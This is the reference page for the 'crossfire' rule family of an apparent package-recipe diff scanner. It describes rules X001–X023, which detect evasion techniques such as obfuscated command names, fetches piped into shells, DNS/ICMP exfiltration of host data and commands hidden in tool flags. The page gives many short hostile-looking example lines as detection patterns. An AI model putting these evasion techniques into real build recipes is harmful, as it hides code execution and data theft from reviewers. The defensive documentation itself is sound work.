# Crossfire

Crossfire rules fire on **how a diff is written**, not on what it does.

Every other rule family matches a payload: a fetch, a write, a privilege
change. Crossfire matches the technique used to hide one. A word the
tokenizer cannot reduce to a literal, a command carried in a config value, a
pipeline whose sink has no name the analyser knows - each is evidence on its
own, whatever payload sits behind it.

This is a reference page. For how rules are weighted and scoped, see
[Rule System](system.md). For the families that match payloads, start at
[All Rules](index.md).

## Why the family exists

Payload rules depend on resolution. When resolution fails, they produce
silence, and silence reads identically to a clean package. Crossfire inverts
that: a defeated tokenizer produces a finding rather than nothing, so evasion
and alarm are the same event.

One crossfire rule covers the evasion surface of every payload rule at once.
It does not identify which payload was hidden, only that hiding occurred.

## What crossfire does not do

- It does not replace tokenizer fixes. A payload hidden by an unanticipated
  technique still passes.
- It does not claim bytes another rule claims. Base64-to-shell belongs to
  [R003](obfuscation.md#r003) and [R043](obfuscation.md#r043), bidi and
  homoglyph codepoints to [R013](deception.md#r013), and `~/` writes to
  [R077](install-and-persist.md#r077).

## The gate is the file, not the function {#the-gate-is-the-file-not-the-function}

Crossfire rules run against shell files. A `.desktop` entry, a licence text
or a README is not a shell file, and a character or construct that would be
evasion in a recipe is ordinary content there.

---

<!-- generated: page-index -->
## Rules on this page

| Rule | Name | Severity |
|---|---|---|
| [X001](#x001) | Encoded Payload Decoded And Executed | CRITICAL |
| [X002](#x002) | Non-Literal Executable Name | CRITICAL |
| [X003](#x003) | Obfuscated Command Argument | HIGH |
| [X004](#x004) | Build Output Suppressed | MEDIUM |
| [X005](#x005) | Home Reached By An Alternative Spelling | HIGH |
| [X006](#x006) | Source Points Somewhere Unexpected | HIGH |
| [X007](#x007) | Multiple Evasion Techniques | CRITICAL |
| [X008](#x008) | Whitespace A Shell Does Not Split On | MEDIUM |
| [X009](#x009) | Fetch Through An Uncatalogued Client | CRITICAL |
| [X010](#x010) | Interpreter One-Liner Reaches The Network | HIGH |
| [X011](#x011) | Package Manager Runs Fetched Code At Build Time | HIGH |
| [X012](#x012) | Build Toolchain Redirected Into The Source Tree | HIGH |
| [X013](#x013) | Fetch Redirected Or Trust Root Replaced | HIGH |
| [X014](#x014) | Environment Variable Names Code To Run | HIGH |
| [X015](#x015) | Work Scheduled To Run After The Build | HIGH |
| [X016](#x016) | Fetch Piped Into An Unrecognised Consumer | HIGH |
| [X017](#x017) | Tool Flag Or Builtin Carries A Command | HIGH |
| [X018](#x018) | Interpreter One-Liner Assembles A Name | HIGH |
| [X019](#x019) | Host Material Sent Or Packaged | HIGH |
| [X020](#x020) | Recipe Writes The Build Steps The Engine Runs | HIGH |
| [X021](#x021) | Executor Runs A File Chosen At Runtime | HIGH |
| [X022](#x022) | Generated Config Handed To The Tool That Reads It | HIGH |
| [X023](#x023) | Command Output Executed As A Script | HIGH |
<!-- /generated: page-index -->

### X001: Encoded Payload Decoded And Executed {#x001}

**CRITICAL** (weight 40) · category `evasion`

Fires when an encoded blob is decoded and the result reaches a shell or
interpreter inside an executing scope. Covers hex and octal escapes, reversed
hex dumps (`xxd -r`, `od -An`, `hexdump`), non-base64 decoders (`base32 -d`,
`basenc`, `openssl enc -d`, `uudecode`), ANSI-C `$'...'` blobs, and `tr`
rotations.

Base64 is excluded: R003 and R043 claim it.

The executor set includes every shell spelling (`ash`, `mksh`, `pdksh`,
`yash`, `posh`, `busybox sh`, `env -S sh`, `source /dev/stdin`) and the
interpreters. `printf '\x63...' | python3` decodes and executes, which is the
rule's claim; no recipe pipes a hex blob into an interpreter by accident.

**Related:** [R003](obfuscation.md#r003), [R043](obfuscation.md#r043)

### X002: Non-Literal Executable Name {#x002}

**CRITICAL** (weight 40) · category `evasion`

Fires when the word in command position is not a literal. Recognised shapes:

| Shape | Example |
|---|---|
| variable | `$cmd`, `${A[0]}`, `${!ref}`, `${c//X/}` |
| substitution | `$(printf '\x63\x75\x72\x6c')`, backticks |
| quote break | `c"u"rl` |
| ANSI-C string | `$'\x63\x75\x72\x6c'` |
| brace expansion | `cur{l,}` |
| homoglyph | `сurl` (Cyrillic `с`) |
| glob | `/usr/bin/c?rl`, `cur[l]` |

Three exclusions keep it precise:

- An assignment is not a command. `font=$(grep ...)` names no executable.
- A variable the tokenizer resolved to a literal is a spelling choice, not an
  evasion.
- A glob needs a name character before the metacharacter, so the `[` of
  `if [ -f x ]` is not a command name.

### X003: Obfuscated Command Argument {#x003}

**HIGH** (weight 25) · category `evasion`

Fires on a `curl`/`wget` long option truncated to a unique prefix
(`--upload-f`), a shell invoked with options stuffed around `-c` (`bash -lc`,
`sh -ec`, `sh -ce`), or a URL whose host is an octal, hex or integer-encoded
IP.

`sh -c` is ordinary and stays quiet. The option cluster must hold at least
two letters, and the `c` may sit anywhere in it.

### X004: Build Output Suppressed {#x004}

**MEDIUM** (weight 15) · category `evasion`

Fires on `TERM=dumb` (quoted or not), `set +x` in any letter order,
`set +o xtrace`, or a redirection that detaches a stream (`exec >/dev/null`,
`exec 2>>/dev/null`, `exec &>/dev/null`, `exec 2>&-`) inside an executing
scope.

MEDIUM because hiding output is weak evidence alone; its value is
compositional, in [X007](#x007). Bare `2>/dev/null` is excluded as noise.

### X005: Home Reached By An Alternative Spelling {#x005}

**HIGH** (weight 25) · category `evasion`

Fires when a write or redirect reaches a home directory by a spelling
[R077](install-and-persist.md#r077) does not match: `/home/alice`,
`/home/$USER/...`, `~alice`, `/root`, `${HOME:-/home/alice}/...`, or a
traversal naming `home` or `root`. The trailing separator is optional.

Defers rather than doubles: a target R077 claims is skipped, so one write
scores once.

Staging paths are exempt, and the exemption belongs to the **target**, not
the line, and is case-sensitive. `$PKGDIR` is not a makepkg variable and
expands to nothing, so `"$PKGDIR/../../home/alice/.bashrc"` is a home write.

### X006: Source Points Somewhere Unexpected {#x006}

**HIGH** (weight 25) · category `evasion`

Fires on a URL shortener or a raw-IP URL anywhere in the diff. Neither is
legitimate in a `source=` array: a shortener hides the destination from the
reader, and a raw IP has no name to check.

Schemes match case-insensitively, as [RFC 3986](https://www.rfc-editor.org/rfc/rfc3986#section-3.1)
requires and curl accepts.

### X007: Multiple Evasion Techniques {#x007}

**CRITICAL** (weight 40) · category `evasion`

Fires when two or more distinct crossfire techniques appear in one diff. One
technique can be an accident of style; two is a method.

### X008: Whitespace A Shell Does Not Split On {#x008}

**MEDIUM** (weight 15) · category `evasion`

Fires on a whitespace character other than space, tab, newline or carriage
return, on an executing line of a shell file.

bash splits words on space, tab and newline. A line reading `make install`
with a NBSP between the words displays as a command and executes as the
single unknown word `make install`. What the reviewer reads is not what
the shell runs.

MEDIUM, not FATAL: the line fails closed, the command is simply not found,
and the realistic benign cause is a copy-paste from a web page.

Zero hits on the benign corpus. One diff in 3,246 carries such a character at
all, in a font licence, which is not a shell file.

**Related:** [R013](deception.md#r013), which claims a disjoint set of
codepoints at FATAL.

### X009: Fetch Through An Uncatalogued Client {#x009}

**CRITICAL** (weight 40) · category `evasion`

Fires when a network client other than `curl`/`wget` feeds a shell or
interpreter on an executing line.

| Fires | Quiet |
|---|---|
| `lftp -c "cat URL" \| bash` | `curl URL \| bash` (R001 claims it) |
| `nc host 80 \| bash` | `dig +short TXT d \| head` |
| `ssh host cat /srv/p.sh \| sh` | `git ls-remote URL \| wc -l` |
| `dig +short TXT d \| tr -d '"' \| sh` | |

The rule reads the **end** of the pipeline, so intervening filters do not
hide the chain. The client vocabulary is shared with R061, R137 and R051
through `config.NETWORK_CLIENT`.

`curl` and `wget` are excluded: R001 and R002 claim those, and one operation
scored twice is its own kind of wrong.

### X010: Interpreter One-Liner Reaches The Network {#x010}

**HIGH** (weight 25) · category `evasion`

Fires when a `-c`/`-e`/`-r` script contains a URL or a fetch call
(`urlopen`, `requests.get`, `file_get_contents`, `LWP`, `socket.connect`).
No shell client is involved, so R061's inventory never sees it.

### X011: Package Manager Runs Fetched Code At Build Time {#x011}

**HIGH** (weight 25) · category `evasion`

Fires when a language package manager resolves and executes third-party code
during the build (`npm install`, `pip install`, `cargo`, `go install`,
`gem`, `composer`, `npx`, `deno run`).

Stands down for local paths, which mean "install what this recipe just
built". Distribution tools are the exception: `pacman -U ./evil.pkg.tar.zst`
installs a local package as root, scriptlets and all.

**Related:** [W002](unverifiable.md#w002), which reports the same act at
weight 0 when nothing else claims it.

### X012: Build Toolchain Redirected Into The Source Tree {#x012}

**HIGH** (weight 25) · category `evasion`

Fires when `CC`, `CXX`, `LD`, `AR`, `PATH`, `LD_PRELOAD`, `LD_LIBRARY_PATH`,
`PYTHONPATH`, `MAKEFLAGS` or a sibling is assigned a path under `$srcdir`,
`$startdir` or `$pkgdir`, and a compile or configure step follows.

The consumer may be an **unchanged** line. An override added above an
existing `make` is the shape where the attacker supplies one line and the
recipe supplies the rest.

`PATH="$srcdir:$PATH"` counts: the variable need not be followed by a path
component.

### X013: Fetch Redirected Or Trust Root Replaced {#x013}

**HIGH** (weight 25) · category `evasion`

Fires when the recipe changes where a fetch goes or what it trusts: a proxy
export, `--resolve`, `--connect-to`, `--doh-url`, or a replaced CA bundle
(`--cacert`, `SSL_CERT_FILE`, `CURL_CA_BUNDLE`).

The URL a reviewer reads is then not the machine the build talks to.
[R057](fetch-and-execution.md#r057) owns `-k`/`--insecure`, which turns verification
off; this is the other half, keeping verification on and owning what it
checks against.

### X014: Environment Variable Names Code To Run {#x014}

**HIGH** (weight 25) · category `evasion`

Fires when a variable or flag carries a value the receiving program executes.

| Kind | Examples |
|---|---|
| shell hooks | `BASH_ENV`, `ENV`, `PROMPT_COMMAND`, `PS0`, `PS4` |
| tool hooks | `GIT_SSH_COMMAND`, `LESSOPEN`, `PAGER`, `EDITOR` |
| loader | `LD_AUDIT`, `GCONV_PATH`, `LOCPATH`, `HOSTALIASES` |
| interpreter preload | `RUBYOPT`, `PERL5OPT`, `PYTHONSTARTUP`, `LUA_INIT` |
| git config keys | `core.fsmonitor`, `diff.external`, `filter.*.clean`, `credential.helper` |
| flag values | `--pre-exec`, `ProxyCommand`, `rsync -e`, any flag whose value begins with an executor and names a build directory |

`PERL5LIB` and `PYTHONPATH` are excluded: they name where to look for
modules, not code to run, and X012 already claims a library path pointed
into the source tree.

git's own semantics decide which values execute. `submodule.<n>.update`
takes `checkout|rebase|merge|none|!command` and an alias is a git subcommand
unless prefixed with `!`, so `git config submodule.x.update none` is quiet.

Stands down when the value is a harmless constant (`PAGER=cat`,
`EDITOR=true`).

### X015: Work Scheduled To Run After The Build {#x015}

**HIGH** (weight 25) · category `evasion`

Fires on `crontab`, `at`, `batch`, `systemd-run`, `incrontab`, `entr`,
`inotifywait`, `udevadm control`, `systemctl start`, or
`systemctl enable --now`.

These register work on the machine doing the building, outside anything
pacman records or can remove. `batch` reads its command from stdin and needs
no argument.

Plain `systemctl enable` is absent: a package's `.install` scriptlet enabling
its own unit is ordinary packaging, and R054 reads the unit file itself.

### X016: Fetch Piped Into An Unrecognised Consumer {#x016}

**HIGH** (weight 25) · category `evasion`

Fires when a pipeline starts with a network client and ends in a command that
is neither a known data consumer nor an executor R001 claims.

| Fires | Quiet |
|---|---|
| `curl u \| deno` | `curl u \| tar -xz` |
| `curl u \| bun` | `curl u \| sha256sum -c` |
| `curl u \| pwsh` | `curl u \| jq -r .x` |
| `curl u \| Rscript` | `curl u \| sudo tee /etc/x` |

The rule enumerates **consumers**, not executors. The set of interpreters is
unbounded and chosen by the attacker; the set of things a recipe pipes a
download into is small and chosen by the ecosystem - an extractor, a
checksum, a text filter, a viewer.

A sink outside that set is claimed, not because it is known to be an
interpreter but because it is not known to be a consumer.

The sink is read after the last **unquoted** `|`, so `echo "a|b" | tar` has
one pipe, and wrappers (`sudo tee`, `LC_ALL=C sort`) are stepped over.

Zero occurrences in the benign corpus.

### X017: Tool Flag Or Builtin Carries A Command {#x017}

**HIGH** (weight 25) · category `evasion`

Fires on a command placed where a command is not expected:

| Form | Effect |
|---|---|
| `tar --checkpoint-action=exec=CMD` | runs per archive checkpoint |
| `tar --to-command=CMD` | runs per archive member |
| `find … -exec sh {} +` | runs per match, with `{}` as the argument |
| `enable -f payload.so name` | loads an arbitrary ELF into bash |
| `hash -p PATH name` | makes an existing name resolve elsewhere |

`find -exec` is narrowed to an executor: `find "$pkgdir" -type f -exec chmod
644 {} +` is how permissions get fixed.

Zero occurrences in the benign corpus.

### X018: Interpreter One-Liner Assembles A Name {#x018}

**HIGH** (weight 25) · category `evasion`

Fires when a `-c`/`-e`/`-r` script builds the name it calls, or hands a
build-tree path to an exec primitive.

| Fires | Quiet |
|---|---|
| `python3 -c 'importlib.import_module("url"+"lib.request")'` | `python3 -c 'import sys; print(sys.version)'` |
| `node -e 'require("child_"+"process")'` | `python3 setup.py build` |
| `python3 -c 'getattr(__import__("os"),"sys"+"tem")(c)'` | `ruby -e 'puts RUBY_VERSION'` |
| `ruby -e 'exec "bash", "$srcdir/x.sh"'` | |

X010 and R044 look for a module or function *name*. A keyword list in a
language with string concatenation is a suggestion, so this rule looks for
the assembly instead: reflection primitives, glued name literals, and exec
calls naming a build directory.

### X019: Host Material Sent Or Packaged {#x019}

**HIGH** (weight 25) · category `evasion`

Fires on two shapes of one act.

**Sent.** A DNS query whose name is computed
(`dig +short "$(hostname).e.example"`) or an ICMP payload that is a hex dump
(`ping -c1 -p "$(od -An -tx1 /etc/hostname)"`). Both carry data out in a
field nobody reads as a channel.

**Packaged.** `env`, `/etc/machine-id`, `~/.ssh`, `/etc/hostname` or shell
history written into `$pkgdir`. Nothing is sent at build time; the
exfiltration happens at publication.

DNS clients are anchored to command position: `host` is also an English word,
and `echo "Host: $(uname -rn)"` is a build script printing a banner.

### X020: Recipe Writes The Build Steps The Engine Runs {#x020}

**HIGH** (weight 25) · category `evasion`

Fires when a `printf`/`echo`/`cat`/`tee` writes a build manifest -
`build.ninja`, `Makefile`, `BUILD.bazel`, `meson.build`, a `*.mk` - whose
content carries a directive the engine executes.

A manifest is normally upstream's, or generated by cmake or meson from
upstream's. When the recipe writes one, the commands in it are the
packager's, and they are data until the engine runs them: no execution rule
reads a `command =` line.

Claims **authoring**, not transforming. `sed -e … Makefile > dest` rewrites
upstream's steps, which is how a DKMS package substitutes a kernel version.

Zero occurrences in the benign corpus.

**Related:** [W004](unverifiable.md#w004), [W005](unverifiable.md#w005)

### X021: Executor Runs A File Chosen At Runtime {#x021}

**HIGH** (weight 25) · category `evasion`

Fires when a known executor's file argument is a positional parameter, an
array element, or a glob.

| Fires | Quiet |
|---|---|
| `set -- *.sh; bash "$1"` | `bash setup.sh` |
| `mapfile -t A < <(ls *.sh); bash "${A[0]}"` | `exec "$@"` |
| `IFS=:; bash $*` | `for f in *.sh; do echo "$f"; done` |
| `bash *.sh` | |

X002 asks whether the *command* can be read from the text; this asks the same
of its argument. `bash` is literal in every firing case, so X002 stands down
and every path-pairing rule looks for a filename that is not there.

`set -- *.sh` followed by a bare `"$@"` is a **pairing**: neither line is
suspicious alone, and `exec "$@"` is how a wrapper forwards its arguments.

Zero occurrences in the benign corpus.

### X022: Generated Config Handed To The Tool That Reads It {#x022}

**HIGH** (weight 25) · category `evasion`

Fires when a write produces a file whose content names a build-tree path, and
a later line passes that file - or its directory, behind a configuration
flag - to a program.

```bash
printf "dhcp-script=$PWD/x.sh\n" > "$srcdir"/d
dnsmasq --conf-file="$srcdir"/d
```

[R145](install-and-persist.md#r145) and [R149](install-and-persist.md#r149)
claim configs that are *shipped*. This one stays in the build tree, where
naming `$srcdir` is normal, and is never installed. What makes it execution
is the second line: the recipe runs the program that reads the file, on the
build machine, at build time.

The pairing is the observable. Writing a config is ordinary; passing a
filename to a program is ordinary.

The destination is the **last unquoted** `>`, because config bodies contain
`>` themselves.

Zero occurrences in the benign corpus.

**Related:** [W006](unverifiable.md#w006), which reports the write alone at
weight 0 when no tool reads it.

### X023: Command Output Executed As A Script {#x023}

**HIGH** (weight 25) · category `evasion`

Fires when a pipeline ends in a shell and does not start with a network
client.

| Fires | Quiet |
|---|---|
| `pass otp e \| bash` | `curl u \| bash` (R001 claims it) |
| `cat /sys/kernel/tracing/trace \| bash` | `make 2>&1 \| tee build.log` |
| `perf script -i data \| bash` | `find . -name "*.o" \| xargs rm -f` |
| `gpg-connect-agent "KEYINFO" /bye \| bash` | |

The bytes are produced locally, so no fetch rule has anything to say, and
what runs is whatever the command printed.

A trailing `|| true` ends the pipeline rather than voiding it, so
`cmd | bash || true` is claimed.

No package in the 3,246-diff benign corpus pipes anything into a shell.
